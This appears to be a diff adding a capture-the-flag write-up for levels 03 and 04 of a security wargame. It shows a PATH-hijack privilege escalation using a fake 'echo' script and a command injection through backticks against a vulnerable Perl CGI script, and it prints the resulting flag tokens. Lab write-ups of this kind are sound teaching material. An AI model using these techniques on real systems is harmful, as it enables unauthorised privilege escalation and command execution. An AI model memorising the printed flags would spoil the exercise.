@@ -163,6 +163,99 @@ kooda2puivaav1idi4f57q8iq
 
 Use this flag/token as the password for `level03`.
 
+---
+
+## Level 03
+
+A binary appeared for `flag03`. Inspecting it with `ltrace` reveals it uses `echo` without an absolute path — it only resolves via the `PATH` environment variable.
+
+### Vulnerability
+
+Since the binary calls `echo` by name and not by full path (`/bin/echo`), we can hijack it by prepending a directory we control to `PATH`.
+
+### Exploitation
+
+1. Navigate to a temporary directory where we have write access:
+
+```bash
+cd /tmp
+```
+
+2. Create a malicious `echo` script that calls `getflag`:
+
+```bash
+echo "/bin/getflag" > echo
+chmod +x echo
+```
+
+3. Prepend `/tmp` to the `PATH` and execute the binary:
+
+```bash
+export PATH=/tmp:$PATH
+/path/to/level03/binary
+```
+
+4. The binary will call our fake `echo`, which in turn calls `getflag`, granting us the token directly.
+
+Token obtained:
+
+```text
+qi0maab88jeaj46qoumi7maus
+```
+
+Use this token as the password for `level04`.
+
+---
+
+## Level 04
+
+We have a Perl script called `level04.pl` running as a CGI service on `localhost:4747`. Inspecting it reveals:
+
+```perl
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+```
+
+### Vulnerability
+
+The script takes the `x` parameter and directly interpolates it into a backtick command. This is a classic command injection vulnerability.
+
+### Initial Attempt
+
+We try a direct semicolon injection:
+
+```bash
+curl localhost:4747/level04.pl?x=;getflag
+```
+
+This doesn't work — the developers anticipated this and filtered it.
+
+### Exploitation
+
+Use backticks within the parameter to execute `getflag` as a command substitution:
+
+```bash
+curl "localhost:4747/level04.pl?x=\`getflag\`"
+```
+
+The backticks force the shell to execute `getflag` first, and since the script runs with `flag04` permissions, it returns the flag.
+
+Token obtained:
+
+```text
+ne2searoevaevoem4ov4ar8ap
+```
+
+Use this token as the password for `level05`.
+
+---
 
 # Any tips for other flags :
 
